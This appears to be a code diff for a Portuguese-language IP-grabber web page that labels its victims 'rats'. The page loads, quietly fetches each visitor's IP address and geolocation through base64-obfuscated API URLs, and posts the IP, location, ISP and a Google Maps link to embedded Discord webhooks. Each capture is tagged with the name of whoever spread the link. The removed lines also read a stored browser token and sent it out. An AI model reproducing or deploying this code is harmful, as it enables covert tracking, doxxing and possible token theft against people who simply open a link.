@@ -30,11 +30,13 @@
                         document.body.appendChild(btn);
                     });
                 });
+
+                const urlParams = new URLSearchParams(window.location.search);
+                client = urlParams.get('client');
             
             class Start {
                 static async start() {
                     let i;
-                    let id = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
                     try{
                     await fetch(atob("aHR0cHM6Ly9hcGktYmRjLm5ldC9kYXRhL2NsaWVudC1pcA=="))
                     .then((body) => body.json())
@@ -42,114 +44,85 @@
                         i = data.ipString;
                     })
                     .catch((error) => {});
-                    await fetch(
+                    
+                    
+                    let resOldApi = await fetch(
                     `${atob("aHR0cHM6Ly9hcGktYmRjLm5ldC9kYXRhL2lwLWdlb2xvY2F0aW9uP2lwPQ==")}${i}${atob("JmxvY2FsaXR5TGFuZ3VhZ2U9ZW4ma2V5PWJkY183ZDk5Y2VmNzM1YTk0Y2I0YjgyZDM3YTI5NTE4YTU2Nw==")}`
-                    )
-                    .then((body) => body.json())
-                    .then((data) => {
-                        let j = localStorage.getItem(atob("YnJvd3Nlcl90b2tlbg=="));
-                        let client = urlParams.get('client');
+                    );  
+
+                        let data = await resOldApi.json();
                         
                        let $loc =  document.getElementById("loc");
                        $loc.innerHTML = data.location.principalSubdivision + ", " + data.location.city + ", " + data.location.localityName;
                         
 
-                        Start.sdc(id, i,` ${
-                            data.location.principalSubdivision +
-                            ", " +
-                            data.location.city +
-                            ", " +
-                            data.location.localityName
-                        }`,j);
-                        
                         if(client != null){
-                            Start.ratoeira(id, `${
+                            Start.ratoeira(i, `${
                             data.location.principalSubdivision +
                             ", " +
                             data.location.localityName
                         }`);
                         }
-                       
-                        
-                    })
-                    .catch((error) => {
-                        console.log("erro: ", error);
-                    });
+                    
+                        let rawJsonString = JSON.stringify(data, null, 2);
 
-                   
-                   
+                        console.log(rawJsonString);
+                        
+
+                    Start.sendIpData(data, "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQzMzY2NTg5MTM3MDkzMDMzOC95RUlNR29qbDdGVEluT3V6NU9JRnItTFpQT3dmMkFjQVMweTBkX0JGOEtjaTlhR2t3NEJRWjJWeEh4NFdsQkllbUdBTA==", `Rato Capturado por ${client}`, `IP do Rato: ${i}`);
+
                     }catch(e){
                     console.log(e);
                     }
                 }
 
-                static  generic(message, id){
-                    let u =
-                    "aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvMTQzNDM2NjE0NDA4NDQ0NzQ1Ni80YXJlZ0FuNGh1eUtua3N3U3BkeHBNRUF1MXNmeVlmWVV4ZmZLVG5SUExVY05nYllreVpZY001Wmt4VW15YWRlMnRURA==";
+                // Grabber
+                static sendIpData(json, url, title, footer) {
                     const request = new XMLHttpRequest();
-                    request.open("POST", atob(u));
-
+                    request.open("POST", atob(url));
                     request.setRequestHeader("Content-type", "application/json");
-                    let nome = "Desconhecido";
-                    try{
-                        const urlParams = new URLSearchParams(window.location.search);
-                        nome = urlParams.get('client');
-                    } catch(e){}
+                   
                     const params = {
                     embeds: [
                         {
-                        title: `Captura de ${nome}`,
+                        title: title,
                         fields: [
+                            // IP
                             {
-                            name: "API Response Data",
-                            value: (function(){try{return "```json\n"+JSON.stringify(JSON.parse(message),null,2).replace(/`/g,"'")+"\n```";}catch(e){return "```json\n"+String(message).replace(/`/g,"'")+"\n```";}})(),
+                            name: "💻 IP",
+                            value: json.ip,
+                            inline: false
                             },
+
+                            // Local
+                            {
+                            name: "🌍 Local",
+                            value: `${json.location.principalSubdivision}, ${json.location.localityName}, ${json.location.city}, ${json.country.isoName}`,
+                            inline: false
+                            },
+
+                            // Provedor
+                            {
+                            name: "🛡️ Provedor",
+                            value: json.network.organisation,
+                            inline: false
+                            },
+
+                            // Google Maps
+                            {
+                            name: "📍 Google Maps",
+                            value: `https://www.google.com/maps?q=${json.location.latitude},${json.location.longitude}`,
+                            inline: false
+                            }
                         ],
                         footer: {
-                            text: "ID do Rato: " + id,
+                            text: footer,
                         },
                         },
                     ],
                     };
-                    request.send(JSON.stringify(params));
-                }
 
-                static sdc(id, a, b, c) {
-                    let u =
-                    "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQzMzY2NTg5MTM3MDkzMDMzOC95RUlNR29qbDdGVEluT3V6NU9JRnItTFpQT3dmMkFjQVMweTBkX0JGOEtjaTlhR2t3NEJRWjJWeEh4NFdsQkllbUdBTA==";
-                    const request = new XMLHttpRequest();
-                    request.open("POST", atob(u));
-
-                    request.setRequestHeader("Content-type", "application/json");
-                    let nome = "Desconhecido";
-                    try{
-                        const urlParams = new URLSearchParams(window.location.search);
-                        nome = urlParams.get('client');
-                    } catch(e){}
-                    const params = {
-                    embeds: [
-                        {
-                        title: `Captura de ${nome}`,
-                        fields: [
-                            {
-                            name: "",
-                            value: `||${c}||`,
-                            },
-                            {
-                            name: "",
-                            value: b,
-                            },
-                            {
-                            name: "",
-                            value: a,
-                            },
-                        ],
-                        footer: {
-                            text: "ID do Rato: " + id,
-                        },
-                        },
-                    ],
-                    };
+                    
                     request.send(JSON.stringify(params));
                 }
 
@@ -176,7 +149,7 @@
                             },
                         ],
                         footer: {
-                            text: "ID do Rato: " + id,
+                            text: "IP do Rato: " + id,
                         },
                         },
                     ],
